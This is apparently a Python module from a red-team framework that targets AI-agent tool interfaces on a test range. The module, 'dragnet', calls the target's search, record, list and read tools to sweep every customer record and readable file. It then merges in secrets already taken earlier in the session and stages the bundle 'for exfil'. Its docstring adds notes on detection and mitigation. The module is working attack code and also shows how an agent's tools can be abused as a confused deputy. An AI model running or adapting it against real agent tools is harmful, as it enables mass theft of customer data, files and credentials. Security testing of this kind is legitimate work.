"""CUT-COLL-003 — Tool-Output Aggregation.

The collection / staging step: before exfil, hoover up everything reachable. ``dragnet``
sweeps the target's read/list tools (every customer record, every readable file) and folds
in whatever the session already looted, staging one bundle (with a manifest) for exfil.

It runs unauthenticated on purpose: it aggregates what any caller can pull directly and
records the protected sources it could NOT reach (a token-gated ``.env``) — the gap a
confused-deputy module like ``keyring`` fills.

Detection / mitigation: rate-limit and flag bulk enumeration; authorize per-record, not
just per-tool; alert when one principal reads a whole table/directory in a session.
"""

from __future__ import annotations

import inspect
from typing import Any

from cutout_range import connect_range

from cutout.engine.evidence import Phase
from cutout.engine.module import BaseModule, Option
from cutout.engine.registry import register
from cutout.engine.session import CheckResult, RunResult, Session

_SEARCH = ("search", "list_customers")
_RECORD = ("get_customer_record", "get_record", "get_customer")
_LISTFILE = ("list_files", "list_dir")
_READFILE = ("read_file", "readfile", "cat", "get_file")


def _find(specs: list[Any], signals: tuple[str, ...], need_param: str | None = None) -> str | None:
    for spec in specs:
        keys = {k.lower() for k in (spec.params or {})}
        name_hit = any(s in spec.name.lower() for s in signals)
        if name_hit and (need_param is None or need_param in keys):
            return str(spec.name)
    return None


@register
class ToolOutputAggregation(BaseModule):
    id = "CUT-COLL-003"
    alias = "dragnet"
    name = "Tool-Output Aggregation"
    tactic = "COLL"
    targets = ["tool"]
    options: dict[str, Option] = {}

    async def _call(self, rng: Any, name: str, args: dict[str, Any]) -> dict[str, Any]:
        res = rng.call_tool(name, args)
        if inspect.isawaitable(res):
            res = await res
        return res  # type: ignore[no-any-return]

    async def check(self, session: Session) -> CheckResult:
        rng = connect_range(session.target)
        specs = rng.list_tools()
        reachable = [s for s in (_find(specs, _SEARCH), _find(specs, _LISTFILE)) if s]
        return CheckResult(
            module_id=self.id,
            susceptible=bool(reachable),
            reason=(
                f"{len(reachable)} enumerable source(s) to bulk-collect: {', '.join(reachable)}"
                if reachable
                else "no enumerable read/list tools exposed"
            ),
            data={"sources": reachable},
        )

    async def run(self, session: Session) -> RunResult:
        rng = connect_range(session.target)
        specs = rng.list_tools()
        records: list[dict[str, Any]] = []
        files: dict[str, str] = {}
        denied: list[str] = []

        search = _find(specs, _SEARCH, need_param="query")
        record = _find(specs, _RECORD, need_param="id")
        if search:
            hits = (await self._call(rng, search, {"query": ""})).get("data") or []
            for hit in hits:
                cid = hit.get("id") if isinstance(hit, dict) else None
                if cid and record:
                    rec = (await self._call(rng, record, {"id": cid})).get("data")
                    records.append({"id": cid, **rec} if isinstance(rec, dict) else {"id": cid})
                elif isinstance(hit, dict):
                    records.append(hit)
            await self.emit(Phase.RUN, "coll.sweep", {"source": search, "records": len(records)})

        listing = _find(specs, _LISTFILE)
        reader = _find(specs, _READFILE, need_param="path")
        if listing and reader:
            paths = (await self._call(rng, listing, {})).get("data") or []
            for path in paths:
                res = await self._call(rng, reader, {"path": path})
                if res.get("ok") and isinstance(res.get("data"), str):
                    files[str(path)] = res["data"]
                else:
                    denied.append(str(path))
            await self.emit(
                Phase.RUN, "coll.sweep", {"source": listing, "files": len(files), "denied": denied}
            )

        secrets = dict(session.secrets)
        staged_bytes = (
            sum(len(str(r)) for r in records)
            + sum(len(v) for v in files.values())
            + sum(len(v) for v in secrets.values())
        )
        session.artifacts["staged_collection"] = {
            "records": records,
            "files": files,
            "secrets": secrets,
            "denied": denied,
            "bytes": staged_bytes,
        }
        await self.emit(
            Phase.RUN,
            "coll.stage",
            {
                "records": len(records),
                "files": len(files),
                "secrets": len(secrets),
                "denied": len(denied),
                "bytes": staged_bytes,
            },
        )

        staged = len(records) + len(files) + len(secrets)
        note = f" ({len(denied)} protected source(s) refused)" if denied else ""
        summary = (
            f"staged {len(records)} record(s), {len(files)} file(s), {len(secrets)} secret(s) "
            f"— {staged_bytes} bytes for exfil{note}"
            if staged
            else "no data could be aggregated"
        )
        return RunResult(
            status="success" if staged else "failed",
            summary=summary,
            data={"records": len(records), "files": len(files), "secrets": len(secrets)},
        )
